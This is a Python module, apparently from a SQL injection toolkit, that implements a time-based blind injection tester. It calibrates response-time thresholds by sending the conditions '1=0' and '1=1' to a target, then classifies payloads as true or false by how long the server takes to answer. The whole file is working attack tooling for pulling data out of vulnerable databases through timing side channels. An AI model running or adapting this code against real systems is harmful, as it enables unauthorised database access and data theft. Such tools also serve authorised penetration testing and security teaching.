import sys

from pysqli.tools import request_time


class TimeBlindTester:
    CALIBRATE_TEST_PASSES = 10

    def __init__(self, rb):
        self.rb = rb
        self.calibrate()

    def test(self, payload):
        delta = request_time(self.rb, payload)
        if delta < self.fmax_false:
            return False
        if delta > self.fmin_true:
            return True
        raise Exception('Time value too close, can\'t determine True of False, try to increase the sleep delay')

    def calibrate(self):

        min_false = sys.maxsize
        max_false = -1

        min_true = sys.maxsize
        max_true = -1

        print('[*] Start callibrate...')

        for i in range(0, self.CALIBRATE_TEST_PASSES):

            print('[*] Passe {}'.format(i))

            t = request_time(self.rb, '1=0')
            print('[*] get {} for False'.format(t))

            if min_false > t:
                min_false = t
            if max_false < t:
                max_false = t

            t = request_time(self.rb, '1=1')
            print('[*] get {} for True'.format(t))

            if min_true > t:
                min_true = t
            if max_true < t:
                max_true = t

        delta_true = max_true - min_true
        delta_false = max_false - min_false

        print('[*] delta False = {}'.format(delta_false))
        print('[*] delta True = {}'.format(delta_true))

        delta = max(delta_true / 4, delta_false / 4, min_false / 4)

        self.fmin_true = min_true - delta
        self.fmax_false = max_false + delta

        print('[+] delta = {}'.format(delta))
        print('[+] min_value for True = {}'.format(self.fmin_true))
        print('[+] max_value for False = {}'.format(self.fmax_false))

        if self.fmin_true <= self.fmax_false or abs(self.fmin_true - self.fmax_false) < delta:
            raise Exception('[-] Callibrate fail, false and true values are too close, Try to increase the sleep delay')
